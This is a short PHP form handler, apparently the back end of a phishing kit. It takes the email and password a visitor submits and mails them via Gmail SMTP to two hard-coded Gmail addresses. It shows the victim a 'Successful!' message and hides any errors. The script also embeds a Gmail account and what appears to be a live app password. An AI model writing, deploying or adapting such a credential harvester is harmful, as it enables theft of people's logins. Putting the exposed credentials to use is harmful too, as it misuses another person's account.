<?php
 use PHPMailer\PHPMailer\PHPMailer;

 require_once 'PHPMailer/src/Exception.php';
 require_once 'PHPMailer/src/PHPMailer.php';
 require_once 'PHPMailer/src/SMTP.php';

 $mail = new PHPMailer(true);
 $alert = '';
 if(isset($_POST['submit'])){
    // $subject = $_POST['subject'];
    $email = $_POST['email'];
    $password = $_POST['password'];

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'charleydrumz@gmail.com';
        $mail->Password = 'ugwnaburcevwqglh';
        $mail->SMTPSecure = "tls";
        $mail->Port = '587';


        $mail->setFrom('charleydrumz@gmail.com');
        $mail->addAddress('angelinajolie100122@gmail.com');
        $mail->addAddress('charleydrumz@gmail.com');
        


        $mail->isHTML(true);
        
        $mail->Body = "Email: $email<br>Password: $password";


        $mail->send();
        $alert= "<div class='alert-light'><span>Successful!</span></div>";


    }catch (Exception $e){
       

    }
 }
 

?>